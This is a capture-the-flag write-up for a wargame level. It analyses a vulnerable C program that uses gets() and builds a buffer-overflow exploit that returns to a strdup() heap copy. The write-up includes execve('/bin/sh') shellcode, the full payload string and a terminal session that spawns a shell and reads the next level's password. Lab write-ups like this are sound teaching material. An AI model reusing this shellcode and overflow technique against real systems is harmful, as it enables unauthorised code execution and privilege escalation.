# Level 2

<h3>source.c</h3>

```console
void p(void) {
  char str[64];
  uint ret;

  fflush(stdout);
  gets(str);

  ret = __builtin_return_address(0): // Compiler function to get the return adress

  if ((ret & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", ret);
    exit(1);
  }
  else {
    puts(str);
    strdup(str);
  }
}

void main(void) {
  p();
}
```

<h3>Analysis</h3>

We have the function main which do nothing but calling `p()`

In the `p()`, it has a protection to check if the return address starts with `0xb`, and will exit if it is

This is very concerning as the initial plan for this exploit is to overwrite the `RET` to call `system()` which in turn, spawn a shell

But after analyzing with `gdb`, the address for ths `system()` is `0xb7e6b060` which starts with `0xb`, thus we could not point to this address

```console
(gdb) p system
$4 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Normaly the address that starts with `0xb7` means that this data are inside the stack, so this prevent the execution of the stack.

We need to find another way to call the `system()` to spawn a shell for our exploit


<h3>Exploit</h3>

At the later part of the program, it will call `strdup()` which will copy whatever we enter during the `gets()`

Why is this important ?

For example, if we input the string `open_shell` to the `get()`, the `str` variable will point to an address which contains the string `open_shell`

Since `str` is part of the local variable which in turn a part of the stack, the address that `str` pointed will definitely starts with `0xb`

However, `strdup()` is a function that use malloc to get memory allocation, which will be in the `heap`

If we check with `ltrace`, `strdup()` will always returns a pointer to the address `0x0804a008`, as it does not start with `0xb`, the program will allows the `RET` to this location

So, imagine if we overwrite the `RET` address to `0x0804a008`, the program will jump to this address and start to read the copied content `open_shell`,

Now if we replace the example string `open_shell` with a real `shellcode`, the program could potentially run the `shellcode` and spawn a `shell` for us!

We can find the `shellcode` in the internet, the following will be equivalent to `execve("/bin/sh")`

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Next we need to find the offset to overwrite the `RET` pointer, using the same method as the previous level, we found that we need `80 bytes` as the offset

The `shellcode` itself is 28 bytes, so we need to add another 52 random char as bytes as the offset + address of the pointer return by `strdup()`

We need to print the `shellcode` first before the random char, because we want the program to run it as soon as it jumps

The final exploit will looks like this

`'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\x08\xa0\x04\x08'`

```console
level2@RainFall:~$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 52 + '\x08\xa0\x04\x08'"; cat - ) | ./level2
1�Ph//shh/bin����°
                   ̀1�@̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

<h3>Helpful link for this exploit</h3>

https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=15

https://www.youtube.com/watch?v=m17mV24TgwY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=17

http://shell-storm.org/shellcode/files/shellcode-811.php
